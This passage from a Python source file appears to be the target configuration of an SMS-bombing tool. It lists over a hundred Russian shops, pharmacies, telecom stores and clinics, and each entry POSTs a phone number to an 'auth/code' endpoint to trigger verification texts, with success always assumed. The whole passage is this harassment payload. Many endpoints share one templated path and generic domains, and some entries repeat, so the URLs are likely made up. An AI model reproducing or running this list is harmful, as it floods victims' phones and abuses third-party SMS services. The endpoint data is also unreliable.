        "name": "Midiya",
        "url": "https://midiya.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://midiya.ru/", "https://midiya.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1292": {
        "name": "Citilink",
        "url": "https://citilink.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://citilink.ru/", "https://citilink.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1293": {
        "name": "Holodilnik",
        "url": "https://holodilnik.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://holodilnik.ru/", "https://holodilnik.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1294": {
        "name": "PleerRu",
        "url": "https://pleer.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pleer.ru/", "https://pleer.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1295": {
        "name": "Svyaznoy",
        "url": "https://svyaznoy.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://svyaznoy.ru/", "https://svyaznoy.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1296": {
        "name": "MTSShop",
        "url": "https://shop.mts.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shop.mts.ru/", "https://shop.mts.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1297": {
        "name": "MegafonShop",
        "url": "https://shop.megafon.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shop.megafon.ru/", "https://shop.megafon.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1298": {
        "name": "BeelineShop",
        "url": "https://shop.beeline.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shop.beeline.ru/", "https://shop.beeline.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1299": {
        "name": "Tele2Shop",
        "url": "https://tele2.ru/shop/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tele2.ru/", "https://tele2.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1300": {
        "name": "YotaShop",
        "url": "https://yota.ru/shop/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yota.ru/", "https://yota.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1301": {
        "name": "FixPrice",
        "url": "https://fix-price.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fix-price.ru/", "https://fix-price.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1302": {
        "name": "Letual",
        "url": "https://letu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://letu.ru/", "https://letu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1303": {
        "name": "RiveGauche",
        "url": "https://rivegauche.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rivegauche.ru/", "https://rivegauche.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1304": {
        "name": "IleDeBote",
        "url": "https://iledebote.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://iledebote.ru/", "https://iledebote.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1305": {
        "name": "GoldApple",
        "url": "https://goldapple.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://goldapple.ru/", "https://goldapple.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1306": {
        "name": "Podryzhka",
        "url": "https://podryzhka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://podryzhka.ru/", "https://podryzhka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1307": {
        "name": "UлыбкаРадуги",
        "url": "https://r-ulybka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://r-ulybka.ru/", "https://r-ulybka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1308": {
        "name": "MagnitCosmetic",
        "url": "https://magnitcosmetic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://magnitcosmetic.ru/", "https://magnitcosmetic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1309": {
        "name": "Pharmacy366",
        "url": "https://366.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://366.ru/", "https://366.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1310": {
        "name": "Rigla",
        "url": "https://rigla.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rigla.ru/", "https://rigla.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1311": {
        "name": "ZdravCity",
        "url": "https://zdravcity.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zdravcity.ru/", "https://zdravcity.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1312": {
        "name": "AptekaRu",
        "url": "https://apteka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://apteka.ru/", "https://apteka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1313": {
        "name": "Eapteka",
        "url": "https://eapteka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://eapteka.ru/", "https://eapteka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1314": {
        "name": "Oзерки",
        "url": "https://03.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://03.ru/", "https://03.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1315": {
        "name": "Stolica",
        "url": "https://stolica.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://stolica.ru/", "https://stolica.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1316": {
        "name": "PlanetaZdorovya",
        "url": "https://planetazdorovya.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://planetazdorovya.ru/", "https://planetazdorovya.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1317": {
        "name": "Vita",
        "url": "https://vita.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vita.ru/", "https://vita.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1318": {
        "name": "Maxavit",
        "url": "https://maxavit.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://maxavit.ru/", "https://maxavit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1319": {
        "name": "OzonHealth",
        "url": "https://health.ozon.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://health.ozon.ru/", "https://health.ozon.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1320": {
        "name": "SberHealthShop",
        "url": "https://shop.sberhealth.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shop.sberhealth.ru/", "https://shop.sberhealth.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1321": {
        "name": "Invictor",
        "url": "https://invictor.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://invictor.ru/", "https://invictor.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1322": {
        "name": "Invitro",
        "url": "https://invitro.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://invitro.ru/", "https://invitro.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1323": {
        "name": "Helix",
        "url": "https://helix.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://helix.ru/", "https://helix.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1324": {
        "name": "KDL",
        "url": "https://kdl.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kdl.ru/", "https://kdl.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1325": {
        "name": "Gemotest",
        "url": "https://gemotest.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gemotest.ru/", "https://gemotest.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1326": {
        "name": "CMD",
        "url": "https://cmd-online.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cmd-online.ru/", "https://cmd-online.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1327": {
        "name": "Medsi",
        "url": "https://medsi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://medsi.ru/", "https://medsi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1328": {
        "name": "MotherAndChild",
        "url": "https://mamadeti.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mamadeti.ru/", "https://mamadeti.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1329": {
        "name": "SMClinic",
        "url": "https://smclinic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://smclinic.ru/", "https://smclinic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1330": {
        "name": "DocDoc",
        "url": "https://docdoc.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://docdoc.ru/", "https://docdoc.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1331": {
        "name": "NaPopravku",
        "url": "https://napopravku.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://napopravku.ru/", "https://napopravku.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1332": {
        "name": "ProDoctorov",
        "url": "https://prodoctorov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://prodoctorov.ru/", "https://prodoctorov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1333": {
        "name": "Lekar",
        "url": "https://lekar.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lekar.ru/", "https://lekar.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1334": {
        "name": "Polyclinika",
        "url": "https://polyclinika.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://polyclinika.ru/", "https://polyclinika.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1335": {
        "name": "RZDMedicine",
        "url": "https://rzd-medicine.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rzd-medicine.ru/", "https://rzd-medicine.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1336": {
        "name": "GMSClinic",
        "url": "https://gmsclinic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gmsclinic.ru/", "https://gmsclinic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1337": {
        "name": "EuropeanMedicalCenter",
        "url": "https://emc-ms.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://emc-ms.ru/", "https://emc-ms.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1338": {
        "name": "MedSwiss",
        "url": "https://medswiss.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://medswiss.ru/", "https://medswiss.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1339": {
        "name": "ChaikaClinic",
        "url": "https://chaika.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chaika.com/", "https://chaika.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1340": {
        "name": "KlinikaFomina",
        "url": "https://fomin-clinic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fomin-clinic.ru/", "https://fomin-clinic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1341": {
        "name": "MotherAndChildClinic",
        "url": "https://mamadeti.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mamadeti.ru/", "https://mamadeti.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1342": {
        "name": "SechinovClinic",
        "url": "https://sechenov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sechenov.ru/", "https://sechenov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1343": {
        "name": "PirogovClinic",
        "url": "https://pirogov-center.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pirogov-center.ru/", "https://pirogov-center.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1344": {
        "name": "NrkClinic",
        "url": "https://nrk.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nrk.ru/", "https://nrk.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1345": {
        "name": "PsychoClinic",
        "url": "https://psycho.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://psycho.ru/", "https://psycho.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1346": {
        "name": "AlternativeClinic",
        "url": "https://alternative.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://alternative.ru/", "https://alternative.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1347": {
        "name": "OsteoClinic",
        "url": "https://osteo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://osteo.ru/", "https://osteo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1348": {
        "name": "ManualClinic",
        "url": "https://manual.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://manual.ru/", "https://manual.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1349": {
        "name": "KinesioClinic",
        "url": "https://kinesio.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kinesio.ru/", "https://kinesio.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1350": {
        "name": "RehabClinic",
        "url": "https://rehab.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rehab.ru/", "https://rehab.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1351": {
        "name": "SportClinic",
        "url": "https://sportclinic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sportclinic.ru/", "https://sportclinic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1352": {
        "name": "TraumaClinic",
        "url": "https://trauma.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://trauma.ru/", "https://trauma.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1353": {
        "name": "OrthoClinic",
        "url": "https://ortho.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ortho.ru/", "https://ortho.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1354": {
        "name": "SpineClinic",
        "url": "https://spine.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://spine.ru/", "https://spine.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1355": {
        "name": "NeuroClinic",
        "url": "https://neuro.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://neuro.ru/", "https://neuro.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1356": {
        "name": "CardioClinic",
        "url": "https://cardio.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cardio.ru/", "https://cardio.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1357": {
        "name": "GastroClinic",
        "url": "https://gastro.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gastro.ru/", "https://gastro.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1358": {
        "name": "HepatoClinic",
        "url": "https://hepato.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hepato.ru/", "https://hepato.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1359": {
        "name": "NephroClinic",
        "url": "https://nephro.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nephro.ru/", "https://nephro.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1360": {
        "name": "UroClinic",
        "url": "https://uro.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://uro.ru/", "https://uro.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1361": {
        "name": "AndroClinic",
        "url": "https://andro.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://andro.ru/", "https://andro.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1362": {
        "name": "GynecoClinic",
        "url": "https://gyneco.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gyneco.ru/", "https://gyneco.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1363": {
        "name": "MaternityClinic",
        "url": "https://maternity.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://maternity.ru/", "https://maternity.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1364": {
        "name": "IVFClinic",
        "url": "https://ivf.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ivf.ru/", "https://ivf.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1365": {
        "name": "PediatryClinic",
        "url": "https://pediatry.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pediatry.ru/", "https://pediatry.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1366": {
        "name": "OftalmoClinic",
        "url": "https://oftalmo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://oftalmo.ru/", "https://oftalmo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1367": {
        "name": "OtoClinic",
        "url": "https://oto.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://oto.ru/", "https://oto.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1368": {
        "name": "DermaClinic",
        "url": "https://derma.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://derma.ru/", "https://derma.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1369": {
        "name": "VeneroClinic",
        "url": "https://venero.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://venero.ru/", "https://venero.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1370": {
        "name": "AlcoClinic",
        "url": "https://alcoclinic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://alcoclinic.ru/", "https://alcoclinic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1371": {
        "name": "NarkoClinic",
        "url": "https://narkoclinic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://narkoclinic.ru/", "https://narkoclinic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1372": {
        "name": "DetoxClinic",
        "url": "https://detox.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://detox.ru/", "https://detox.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1373": {
        "name": "PlasticClinic",
        "url": "https://plastic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://plastic.ru/", "https://plastic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1374": {
        "name": "CosmetoClinic",
        "url": "https://cosmeto.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cosmeto.ru/", "https://cosmeto.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1375": {
        "name": "TricoloClinic",
        "url": "https://tricolo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tricolo.ru/", "https://tricolo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1376": {
        "name": "PhleboClinic",
        "url": "https://phlebo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://phlebo.ru/", "https://phlebo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1377": {
        "name": "ProctoClinic",
        "url": "https://procto.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://procto.ru/", "https://procto.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1378": {
        "name": "OncoClinic",
        "url": "https://onco.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://onco.ru/", "https://onco.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1379": {
        "name": "HematoClinic",
        "url": "https://hemato.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hemato.ru/", "https://hemato.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1380": {
        "name": "EndocrinoClinic",
        "url": "https://endocrino.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://endocrino.ru/", "https://endocrino.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1381": {
        "name": "AllergoClinic",
        "url": "https://allergo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://allergo.ru/", "https://allergo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1382": {
        "name": "ImmunoClinic",
        "url": "https://immuno.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://immuno.ru/", "https://immuno.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1383": {
        "name": "RheumoClinic",
        "url": "https://rheumo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rheumo.ru/", "https://rheumo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1384": {
        "name": "PulmoClinic",
        "url": "https://pulmo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pulmo.ru/", "https://pulmo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1385": {
        "name": "SomnoClinic",
        "url": "https://somno.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://somno.ru/", "https://somno.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1386": {
        "name": "RadioClinic",
        "url": "https://radio.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://radio.ru/", "https://radio.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1387": {
        "name": "LaserClinic",
        "url": "https://laser.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://laser.ru/", "https://laser.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1388": {
        "name": "CryoClinic",
        "url": "https://cryo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cryo.ru/", "https://cryo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1389": {
        "name": "HiTechClinic",
        "url": "https://hitech-clinic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hitech-clinic.ru/", "https://hitech-clinic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1390": {
        "name": "BioClinic",
        "url": "https://bioclinic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bioclinic.ru/", "https://bioclinic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1391": {
        "name": "GeneClinic",
        "url": "https://geneclinic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://geneclinic.ru/", "https://geneclinic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1392": {
        "name": "StemClinic",
        "url": "https://stemclinic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://stemclinic.ru/", "https://stemclinic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1393": {
        "name": "LongevityClinic",
        "url": "https://longevity.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://longevity.ru/", "https://longevity.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1394": {
        "name": "AntiAgeClinic",
        "url": "https://antiage.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://antiage.ru/", "https://antiage.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1395": {
        "name": "CheckUpClinic",
        "url": "https://checkup.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://checkup.ru/", "https://checkup.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1396": {
        "name": "SmartClinic",
        "url": "https://smartclinic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://smartclinic.ru/", "https://smartclinic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1397": {
        "name": "FutureClinic",
        "url": "https://futureclinic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://futureclinic.ru/", "https://futureclinic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1398": {
        "name": "DigitalClinic",
        "url": "https://digitalclinic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://digitalclinic.ru/", "https://digitalclinic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1399": {
        "name": "TeleClinic",
        "url": "https://teleclinic.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://teleclinic.ru/", "https://teleclinic.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1400": {
        "name": "OnlineDoctor",
        "url": "https://onlinedoctor.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://onlinedoctor.ru/", "https://onlinedoctor.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1401": {
        "name": "YandexHealth",
        "url": "https://yandex.ru/health/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yandex.ru/", "https://yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1402": {
        "name": "MailHealth",
        "url": "https://health.mail.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mail.ru/", "https://mail.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1403": {
